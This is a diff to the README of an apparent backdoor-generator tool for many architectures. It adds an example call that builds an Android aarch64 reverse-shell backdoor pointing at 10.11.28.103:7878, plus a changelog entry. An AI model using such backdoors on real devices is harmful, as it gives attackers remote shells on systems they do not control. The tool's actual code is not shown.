@@ -38,6 +38,7 @@ When importing this module will import the pwn module
 >>> armebv7_backdoor(reverse_ip,reverse_port)
 >>> mips64_backdoor(reverse_ip,reverse_port)
 >>> mips64el_backdoor(reverse_ip,reverse_port)
+>>> android_aarch64_backdoor("10.11.28.103",7878)
 ```
 expample:
 ```
@@ -58,6 +59,7 @@ mipsel_backdoor is ok in current path ./
 >>> armebv7_backdoor(reverse_ip,reverse_port)
 >>> mips64_reverse_sl(reverse_ip,reverse_port)
 >>> mips64el_reverse_sl(reverse_ip,reverse_port)
+
 ```
 example:
 ```
@@ -138,6 +140,8 @@ Qualcomm Snapdragon 660
  2022.5.5 0.0.8 version Solved the bug that mips_reverse_sl and mipsel_reverse_sl were not enabled, added mips64_backdoor, mips64_reverse_sl generation and mips64el_backdoor, mips64el_reverse_sl generation
  
  2022.5.21 0.0.9 version changed the generation method of armel V5 backdoor and added the specified generation of riscv-v64 backdoor
+ 
+ 2022.6.27 0.1.0 Added Android backdoor generation
 
 ## One-click build environment
 
